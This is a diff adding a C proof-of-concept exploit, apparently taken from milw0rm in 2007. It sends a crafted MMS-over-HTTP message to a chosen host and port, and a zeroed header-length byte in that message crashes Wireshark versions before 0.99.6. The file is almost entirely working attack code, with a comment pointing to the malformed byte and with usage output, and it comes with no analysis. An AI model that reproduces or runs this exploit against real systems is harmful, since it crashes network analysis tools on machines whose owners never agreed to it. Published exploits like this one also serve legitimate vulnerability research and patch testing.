@@ -1,0 +1,105 @@
+#include <winsock2.h>
+#include <stdio.h>
+
+#pragma comment(lib, "ws2_32")
+
+char *http =
+       "POST / HTTP/1.0\r\n"
+       "Content-Type: application/vnd.wap.mms-message\r\n";
+
+char *hoststr = "Host: %s:%d\r\n";
+char *contentlenstr = "Content-Length: %d\r\n\r\n";
+
+unsigned char mms[] =
+{
+       0x8c,0x80,//X-Mms-Message-Type: m-send-req(0x80)
+       0x98,0x7a,0x77,0x65,0x6c,0x6c,0x00,//X-Mms-Transaction-ID: zwell
+       0x8d,0x92,//X-Mms-MMS-Version: 1.2
+       0x97,0x31,0x33,0x35,0x31,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x00,//To: 13510000000
+       0x84,0xa3,//Content-Type: application/vnd.wap.multipart.mixed
+       //////////////////////////////////////////////////
+       0x01,//multipart,count
+       0x0f,//HeadersLen
+       0x05,//DataLen
+       0x00,//headlen <<<=== If this is 0x00, then wireshark will be crash. The real value is the follow three lines bytes which is 0x0e
+       ///
+       0x83,0x85,//Utf-8
+       0x7a,0x77,0x65,0x6c,0x6c,0x2e,0x74,0x78,0x74,0x00,//Name: zwell.txt
+       0x81,0xea,//Charset: utf-8
+       ///
+       0x7a,0x77,0x65,0x6c,0x6c,//zwell
+};
+
+SOCKET connect_to_host(char *h, int p)
+{
+       SOCKET sock;
+       struct hostent *host;
+       struct sockaddr_in saddr;
+
+       if((host=gethostbyname(h))==NULL)
+       {
+               printf("resolv host %s error\n", h);
+               exit(-1);
+       }
+
+       if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+       {
+               printf("create socket error\n");
+               exit(-1);
+       }
+       memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
+       saddr.sin_family=AF_INET;
+       saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);
+       saddr.sin_port=htons(p);
+       if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0)
+       {
+               printf("connect to host %s on port %d error\n", h, p);
+               exit(-1);
+       }
+
+       return sock;
+}
+
+
+void socket_init()
+{
+       WSADATA wsaData;
+       WSAStartup(MAKEWORD(2,0), &wsaData);
+}
+
+
+int main(int argc, char **argv)
+{
+       SOCKET s;
+       char sendbuf[1024];
+       int len = 0;
+
+       printf("WireShark<0.99.6 MMS protocol DOS PoC\nCoded By ZwelL\nhttp://www.nosec.org\n");
+       if(argc != 3)
+       {
+               printf("usage : %s <host> <port>\n", argv[0]);
+               exit(-1);
+       }
+       socket_init();
+       s = connect_to_host(argv[1], atoi(argv[2]));
+
+       strcpy(&sendbuf[len], http);
+       len += strlen(http);
+
+       sprintf(&sendbuf[len], hoststr, argv[1], atoi(argv[2]));
+       len = strlen(sendbuf);
+
+       sprintf(&sendbuf[len], contentlenstr, sizeof(mms));
+       len = strlen(sendbuf);
+
+       memcpy(&sendbuf[len], mms, sizeof(mms));
+       len += sizeof(mms);
+
+       send(s, sendbuf, len, 0);
+
+       printf("completed!\n");
+
+       return 0;
+}
+
+// milw0rm.com [2007-08-14]
